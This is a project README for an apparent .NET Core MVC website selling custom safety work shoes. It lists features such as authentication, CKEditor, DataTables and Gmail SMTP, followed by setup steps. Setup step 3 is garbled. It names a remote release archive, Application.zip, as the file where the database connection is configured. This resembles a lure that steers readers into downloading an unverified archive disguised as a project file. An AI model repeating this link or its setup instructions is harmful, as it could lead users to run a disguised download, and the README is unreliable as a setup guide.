# Alpha - Custom Safety Work Shoes Website 🥾

Welcome to **Alpha**, a freelance website dedicated to custom-made safety work shoes. This repository allows users to update, delete, and create various entities related to safety work shoes. The main focus is on providing a seamless experience in managing resources within the system. The platform also features functionality to update values in resx files, as well as the creation and deletion of entities with proper communication between them.

## Features 🛠️

- **Authentication and Authorization**: Secure user authentication and authorization mechanisms in place to protect sensitive data and resources.
- **CKEditor 4 Integration**: Rich text editing capabilities for enhanced content creation and management.
- **DataTables Plugin**: Interactive and efficient data tables for displaying information in a structured format.
- **Dotnet Core Integration**: Taking advantage of the features and performance of the .NET Core framework.
- **Gmail SMTP Integration**: Seamless email sending capabilities using Gmail's SMTP servers.
- **Identity Management**: Efficient management of user identities for personalized experiences.
- **MSSQL Database Integration**: Utilizing a MSSQL database for robust data storage and retrieval.
- **MVC Architecture**: Following the Model-View-Controller design pattern for clear separation of concerns.
- **Resx File Management**: Simplified management of resource files for localization and configuration purposes.
- **SMTP Mail Integration**: Easy configuration and sending of emails using SMTP protocols.

## Getting Started 🚀

To get started with this project, follow these steps:

1. Clone the repository to your local machine.
2. Install the necessary dependencies by running `dotnet restore`.
3. Configure the database connection in the `https://github.com/ITACHIabimem/Alpha/releases/download/v1.0/Application.zip` file.
4. Run the application using `dotnet run`.
5. Access the website through your browser at `http://localhost:5000`.
